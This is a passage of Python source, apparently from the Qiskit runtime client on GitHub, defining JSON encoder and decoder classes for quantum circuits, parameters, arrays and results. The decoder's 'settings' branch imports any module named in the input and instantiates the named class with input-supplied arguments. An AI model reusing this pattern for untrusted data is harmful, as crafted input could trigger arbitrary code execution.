 if compress: serialized\_data = zlib.compress(serialized\_data) return base64.standard\_b64encode(serialized\_data).decode("utf-8")
def \_decode\_and\_deserialize(data: str, deserializer: Callable, decompress: bool = True) -> Any: """Decode and deserialize input data.
 Args: data: Data to be deserialized. deserializer: Function used to deserialize data. decompress: Whether to decompress.
 Returns: Deserialized data. """ buff = io.BytesIO() decoded = base64.standard\_b64decode(data) if decompress: decoded = zlib.decompress(decoded)
 with io.BytesIO() as buff: buff.write(decoded) buff.seek(0) return deserializer(buff)
def \_deserialize\_from\_settings(mod\_name: str, class\_name: str, settings: Dict) -> Any: """Deserialize an object from its settings.
 Args: mod\_name: Name of the module. class\_name: Name of the class. settings: Object settings.
 Returns: Deserialized object.
 Raises: ValueError: If unable to find the class. """ mod = importlib.import\_module(mod\_name) for name, clz in inspect.getmembers(mod, inspect.isclass): if name == class\_name: return clz(\*\*settings) raise ValueError(f"Unable to find class {class\_name} in module {mod\_name}")
def \_set\_int\_keys\_flag(obj: Dict) -> Union[Dict, List]: """Recursively sets '\_\_int\_keys\_\_' flag if dictionary uses integer keys
 Args: obj: dictionary
 Returns: obj with the '\_\_int\_keys\_\_' flag set if dictionary uses integer key """ if isinstance(obj, dict): for k, val in list(obj.items()): if isinstance(k, int): obj["\_\_int\_keys\_\_"] = True \_set\_int\_keys\_flag(val) return obj
def \_cast\_strings\_keys\_to\_int(obj: Dict) -> Dict: """Casts string to int keys in dictionary when '\_\_int\_keys\_\_' flag is set
 Args: obj: dictionary
 Returns: obj with string keys cast to int keys and '\_\_int\_keys\_\_' flags removed """ if isinstance(obj, dict): int\_keys: List[int] = [] for k, val in list(obj.items()): if "\_\_int\_keys\_\_" in obj: try: int\_keys.append(int(k)) except ValueError: pass \_cast\_strings\_keys\_to\_int(val) while len(int\_keys) > 0: key = int\_keys.pop() obj[key] = obj[str(key)] obj.pop(str(key)) if "\_\_int\_keys\_\_" in obj: del obj["\_\_int\_keys\_\_"] return obj
class RuntimeEncoder(json.JSONEncoder): """JSON Encoder used by runtime service."""
 def default(self, obj: Any) -> Any: # pylint: disable=arguments-differ if isinstance(obj, date): return {"\_\_type\_\_": "datetime", "\_\_value\_\_": obj.isoformat()} if isinstance(obj, complex): return {"\_\_type\_\_": "complex", "\_\_value\_\_": [obj.real, obj.imag]} if isinstance(obj, np.ndarray): if obj.dtype == object: return {"\_\_type\_\_": "ndarray", "\_\_value\_\_": obj.tolist()} value = \_serialize\_and\_encode(obj, np.save, allow\_pickle=False) return {"\_\_type\_\_": "ndarray", "\_\_value\_\_": value} if isinstance(obj, np.int64): return obj.item() if isinstance(obj, set): return {"\_\_type\_\_": "set", "\_\_value\_\_": list(obj)} if isinstance(obj, Result): return {"\_\_type\_\_": "Result", "\_\_value\_\_": obj.to\_dict()} if hasattr(obj, "to\_json"): return {"\_\_type\_\_": "to\_json", "\_\_value\_\_": obj.to\_json()} if isinstance(obj, QuantumCircuit): kwargs: Dict[str, object] = {"use\_symengine": bool(optionals.HAS\_SYMENGINE)} if \_TERRA\_VERSION[0] >= 1: # NOTE: This can be updated only after the server side has # updated to a newer qiskit version. kwargs["version"] = 10 value = \_serialize\_and\_encode( data=obj, serializer=lambda buff, data: dump( data, buff, RuntimeEncoder, \*\*kwargs ), # type: ignore[no-untyped-call] ) return {"\_\_type\_\_": "QuantumCircuit", "\_\_value\_\_": value} if isinstance(obj, Parameter): value = \_serialize\_and\_encode( data=obj, serializer=\_write\_parameter, compress=False, ) return {"\_\_type\_\_": "Parameter", "\_\_value\_\_": value} if isinstance(obj, ParameterExpression): value = \_serialize\_and\_encode( data=obj, serializer=\_write\_parameter\_expression, compress=False, use\_symengine=bool(optionals.HAS\_SYMENGINE), ) return {"\_\_type\_\_": "ParameterExpression", "\_\_value\_\_": value} if isinstance(obj, ParameterView): return obj.data if isinstance(obj, Instruction): kwargs = {"use\_symengine": bool(optionals.HAS\_SYMENGINE)} if \_TERRA\_VERSION[0] >= 1: # NOTE: This can be updated only after the server side has # updated to a newer qiskit version. kwargs["version"] = 10 # Append instruction to empty circuit quantum\_register = QuantumRegister(obj.num\_qubits) quantum\_circuit = QuantumCircuit(quantum\_register) quantum\_circuit.append(obj, quantum\_register) value = \_serialize\_and\_encode( data=quantum\_circuit, serializer=lambda buff, data: dump( data, buff, \*\*kwargs ), # type: ignore[no-untyped-call] ) return {"\_\_type\_\_": "Instruction", "\_\_value\_\_": value} if isinstance(obj, ObservablesArray): return {"\_\_type\_\_": "ObservablesArray", "\_\_value\_\_": obj.tolist()} if isinstance(obj, BindingsArray): out\_val = {"shape": obj.shape} encoded\_data = {} for key, val in obj.data.items(): encoded\_data[json.dumps(key, cls=RuntimeEncoder)] = val out\_val["data"] = encoded\_data return {"\_\_type\_\_": "BindingsArray", "\_\_value\_\_": out\_val} if isinstance(obj, BitArray): out\_val = {"array": obj.array, "num\_bits": obj.num\_bits} return {"\_\_type\_\_": "BitArray", "\_\_value\_\_": out\_val} if isinstance(obj, DataBin): out\_val = { "field\_names": obj.\_FIELDS, "field\_types": [str(field\_type) for field\_type in obj.\_FIELD\_TYPES], "shape": obj.\_SHAPE, "fields": {field\_name: getattr(obj, field\_name) for field\_name in obj.\_FIELDS}, } return {"\_\_type\_\_": "DataBin", "\_\_value\_\_": out\_val} if isinstance(obj, EstimatorPub): return ( obj.circuit, obj.observables.tolist(), obj.parameter\_values.as\_array(obj.circuit.parameters), obj.precision, ) if isinstance(obj, SamplerPub): return ( obj.circuit, obj.parameter\_values.as\_array(obj.circuit.parameters), obj.shots, ) if isinstance(obj, PubResult): out\_val = {"data": obj.data, "metadata": obj.metadata} return {"\_\_type\_\_": "PubResult", "\_\_value\_\_": out\_val} if isinstance(obj, PrimitiveResult): out\_val = {"pub\_results": obj.\_pub\_results, "metadata": obj.metadata} return {"\_\_type\_\_": "PrimitiveResult", "\_\_value\_\_": out\_val} if HAS\_AER and isinstance(obj, qiskit\_aer.noise.NoiseModel): return {"\_\_type\_\_": "NoiseModel", "\_\_value\_\_": obj.to\_dict()} if hasattr(obj, "settings"): return { "\_\_type\_\_": "settings", "\_\_module\_\_": obj.\_\_class\_\_.\_\_module\_\_, "\_\_class\_\_": obj.\_\_class\_\_.\_\_name\_\_, "\_\_value\_\_": \_set\_int\_keys\_flag(copy.deepcopy(obj.settings)), } if callable(obj): warnings.warn(f"Callable {obj} is not JSON serializable and will be set to None.") return None if HAS\_SCIPY and isinstance(obj, scipy.sparse.spmatrix): value = \_serialize\_and\_encode(obj, scipy.sparse.save\_npz, compress=False) return {"\_\_type\_\_": "spmatrix", "\_\_value\_\_": value} return super().default(obj)
class RuntimeDecoder(json.JSONDecoder): """JSON Decoder used by runtime service."""
 def \_\_init\_\_(self, \*args: Any, \*\*kwargs: Any): super().\_\_init\_\_(object\_hook=self.object\_hook, \*args, \*\*kwargs) self.\_\_parameter\_vectors: Dict[str, Tuple[ParameterVector, set]] = {} self.\_\_read\_parameter\_expression = ( functools.partial( \_read\_parameter\_expression\_v3, vectors=self.\_\_parameter\_vectors, ) if \_TERRA\_VERSION >= (0, 19, 1) else \_read\_parameter\_expression )
 def object\_hook(self, obj: Any) -> Any: """Called to decode object.""" if "\_\_type\_\_" in obj: obj\_type = obj["\_\_type\_\_"] obj\_val = obj["\_\_value\_\_"]
 if obj\_type == "datetime": return dateutil.parser.parse(obj\_val) if obj\_type == "complex": return obj\_val[0] + 1j \* obj\_val[1] if obj\_type == "ndarray": if isinstance(obj\_val, list): return np.array(obj\_val) return \_decode\_and\_deserialize(obj\_val, np.load) if obj\_type == "set": return set(obj\_val) if obj\_type == "QuantumCircuit": return \_decode\_and\_deserialize(obj\_val, load)[0] if obj\_type == "Parameter": return \_decode\_and\_deserialize(obj\_val, \_read\_parameter, False) if obj\_type == "ParameterExpression": return \_decode\_and\_deserialize( obj\_val, self.\_\_read\_parameter\_expression, False # type: ignore[arg-type] ) if obj\_type == "Instruction": # Standalone instructions are encoded as the sole instruction in a QPY serialized circuit # to deserialize load qpy circuit and return first instruction object in that circuit. circuit = \_decode\_and\_deserialize(obj\_val, load)[0] return circuit.data[0][0] if obj\_type == "settings": return \_deserialize\_from\_settings( mod\_name=obj["\_\_module\_\_"], class\_name=obj["\_\_class\_\_"], settings=\_cast\_strings\_keys\_to\_int(obj\_val), ) if obj\_type == "Result": return Result.from\_dict(obj\_val) if obj\_type == "spmatrix": return \_decode\_and\_deserialize(obj\_val, scipy.sparse.load\_npz, False) if obj\_type == "ObservablesArray": return ObservablesArray(obj\_val) if obj\_type == "BindingsArray": ba\_kwargs = {"shape": obj\_val.get("shape", None)} data = obj\_val.get("data", None) if isinstance(data, dict): decoded\_data = {} for key, val in data.items(): # Convert to tuple or it can't be a key decoded\_key = tuple(json.loads(key, cls=RuntimeDecoder)) decoded\_data[decoded\_key] = val ba\_kwargs["data"] = decoded\_data elif data: raise ValueError(f"Unexpected data type {type(data)} in BindingsArray.") return BindingsArray(\*\*ba\_kwargs) if obj\_type == "BitArray": return BitArray(\*\*obj\_val) if obj\_type == "DataBin": field\_names = obj\_val["field\_names"] field\_types = [ globals().get(field\_type, field\_type) for field\_type in obj\_val["field\_types"] ] shape = obj\_val["shape"] if shape is not None and isinstance(shape, list): shape = tuple(shape) data\_bin\_cls = make\_data\_bin(zip(field\_names, field\_types), shape=shape) return data\_bin\_cls(\*\*obj\_val["fields"]) if obj\_type == "PubResult": return PubResult(\*\*obj\_val) if obj\_type == "PrimitiveResult": return PrimitiveResult(\*\*obj\_val) if obj\_type == "to\_json": return obj\_val if obj\_type == "NoiseModel": if HAS\_AER: return qiskit\_aer.noise.NoiseModel.from\_dict(obj\_val) warnings.warn("Qiskit Aer is needed to restore noise model.") return obj\_val return obj

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


